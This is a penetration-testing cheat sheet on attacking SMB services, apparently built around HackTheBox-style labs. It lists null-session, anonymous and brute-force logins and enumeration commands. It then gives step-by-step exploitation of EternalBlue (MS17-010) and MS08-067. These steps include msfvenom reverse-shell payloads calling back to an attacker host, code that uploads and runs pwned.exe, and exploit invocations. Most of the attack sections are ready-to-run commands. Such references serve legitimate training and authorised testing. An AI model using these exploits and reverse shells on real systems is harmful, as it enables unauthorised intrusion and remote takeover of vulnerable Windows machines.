---
description: Ports 445,139
---

# SMB

## Theory

The Server Message Block Protocol (SMB Protocol) is a client-server communication protocol used for sharing access to files, printers, serial ports, and data on a network. It can also carry transaction protocols for authenticated inter-process communication.

SMB protocols operate on different ports depending on the type of communication:

* **Port 445 (TCP)**: This port is used for direct SMB communication over TCP/IP, including file and printer sharing, remote administration, and inter-process communication.
* **Port 139 (TCP)**: This port is used for SMB over NetBIOS, which is an underlying protocol that SMB relies on for name resolution and session establishment.

## Practice

### Authentication

{% tabs %}
{% tab title="Null session" %}
`Null session` refers to an unauthenticated session established with an SMB server where the client does not provide any credentials.

```bash
#SmbClient
smbclient -U '' -N -L '\\<IP>\'

#CrackMapExec
crackmapexec smb <IP> -u '' -p '' --shares
```
{% endtab %}

{% tab title="Anonymous logon" %}
The inclusion of `Anonymous` and `Everyone` access group in the `pre-Windows 2000 compatible` access group allow us to make an anonymous connection over SMB. Using a random username and password you can check if the target accepts annonymous/guest logon

```bash
#SmbClient
smbclient -N -L '\\<IP>\'
smbclient -U 'a' -N -L '\\<IP>\'

#CrackMapExec
crackmapexec smb <IP> -u 'a' -p '' --shares
```
{% endtab %}

{% tab title="Bruteforce" %}
Tools like [hydra](https://github.com/vanhauser-thc/thc-hydra) or [nmap](https://github.com/nmap/nmap) can be used to operate authentication bruteforce attacks.

```bash
# hydra
hydra -L usernames.txt -P passwords.txt <IP> -V -f smb

# nmap
nmap --script smb-brute -p 445 <IP>
```
{% endtab %}
{% endtabs %}

### Enumerate

{% tabs %}
{% tab title="nmap" %}
Tools like [nmap](https://github.com/nmap/nmap) can be used to enumerate SMB.

```bash
#list the supported protocols and dialects of a SMB server. 
nmap --script="smb-protocols" -p 445 <IP>

#Determines the message signing configuration
nmap --script="smb-security-mode" -p 445 <IP>

#Try to enum SMB sessions/shares/users/domains/groups... with null/anonymous session
nmap --script="smb-enum*" -p 445 <IP>

#Or enum with a valide session
nmap --script="smb-enum-shares" --script-args smbusername=administrator,smbpassword=mypassword_1 -p 445 <IP>
```
{% endtab %}

{% tab title="CrackMapExec" %}
Tools like [CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec) can be used to enumerate SMB.

```bash
#Enum host with SMB signing not required
crackmapexec smb 192.168.1.0/24 --gen-relay-list relaylistOutputFilename.txt

#Enum password policy
crackmapexec smb $IP -u $USER -p $PASS --pass-pol

#Enum domain users
crackmapexec smb $IP -u $USER -p $PASS --users
crackmapexec smb $IP -u $USER -p $PASS --rid-brute 5000


#Enum domain groups
crackmapexec smb $IP -u $USER -p $PASS --groups

#Enum local groups
crackmapexec smb $IP -u $USER -p $PASS --local-group

#Enum active sessions
crackmapexec smb $IP -u $USER -p $PASS --sessions

#Enum shares & access
crackmapexec smb $IP -u $USER -p $PASS --shares
```
{% endtab %}
{% endtabs %}

### Vulnerabilities

You may use nmap to scan target for SMB vulnerabilities

```bash
sudo nmap -p 445 --script="smb-vuln-*" <IP>
```

#### EternalBlue - MS17-010

Eternalblue is a flaw that allows remote attackers to execute arbitrary code on a target system by sending specially crafted messages to the SMBv1 server.

{% tabs %}
{% tab title="Enumerate" %}
Tools like [nmap](https://github.com/nmap/nmap) can be used to detect the presence of the EternalBlue vulnerability.

```bash
sudo nmap -p 445 --script="smb-vuln-ms17-010" <IP>
```
{% endtab %}

{% tab title="Exploit - worawit" %}
To exploit, we may use the Worawit [PoC](https://github.com/worawit/MS17-010) on GitHub

* first, we have to edit `USERNAME` and `PASSWORD` at the begening of the `zzz_exploit.py` script.
* Second, generate a reverse shell

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=9001 EXITFUNC=thread -f exe -a x86 --platform windows -o pwned.exe
```

* Third, we have to edit , he `smb_pwn` function in `zzz_exploit.py`. This is the action taken with the exploit.

```bash
smb_send_file(smbConn, '/home/v4resk/Documents/www/pwned.exe', 'C', '/pwned.exe')
service_exec(conn, r'cmd /c c:\\pwned.exe')
```

* Fourth, trigger the exploit

```bash
#Exploit
python2.7 zzz_exploit.py <IP>

#Exploit on ntsvcs named pipe
python2.7 zzz_exploit.py <IP> ntsvcs
```
{% endtab %}

{% tab title="Exploit - helviojunior" %}
To exploit, we may use the helviojunior [PoC](https://github.com/helviojunior/MS17-010) on GitHub. He forked the worawit repo and added a single `send_and_execute.py`, which is really handy.

* First, we have to edit `USERNAME` and `PASSWORD` at the begening of the `send_and_execute.py` script
* Second, generate a reverse shell

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=9001 EXITFUNC=thread -f exe -a x86 --platform windows -o pwned.exe
```

* Third, trigger the exploit

```bash
#Exploit
python2.7 send_and_execute.py <IP> pwned.exe

#Exploit on ntsvcs named pipe
python2.7 send_and_execute.py <IP> pwned.exe ntsvcs
```
{% endtab %}
{% endtabs %}

#### MS08-067

The MS08-067 vulnerability is a buffer overflow vulnerability in the Windows Server service.The vulnerability could allow remote code execution if an affected system received a specially crafted RPC request. On Microsoft Windows 2000, Windows XP, and Windows Server 2003 systems, an attacker could exploit this vulnerability without authentication to run arbitrary code.

{% tabs %}
{% tab title="Enumerate" %}
Tools like [nmap](https://github.com/nmap/nmap) can be used to to detect the presence of the MS08-067 vulnerability.

```bash
sudo nmap -p 445 --script="smb-vuln-ms08-067" <IP>
```
{% endtab %}

{% tab title="Exploit" %}
To exploit, we may use the jivoi [PoC](https://raw.githubusercontent.com/jivoi/pentest/master/exploit\_win/ms08-067.py) on GitHub.

* First, generate a Python shellcode and utilize it to replace the current one in `ms08-067.py`.

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=9001 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode -a x86 --platform windows
```

* Second, we have to guess version of windows and language pack. The exploit takes advantage of knowing where some little bits of code will be in memory, and uses those bits on the path to shell.
* Third, trigget the exploit

```bash
#6 is for Windows XP SP3 English (NX)
python ms08-067.py 10.10.10.4 6 445

#4 is for Windows 2003 SP1 English
python ms08-067.py 10.10.10.4 4 445
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://0xdf.gitlab.io/2019/02/21/htb-legacy.html" %}
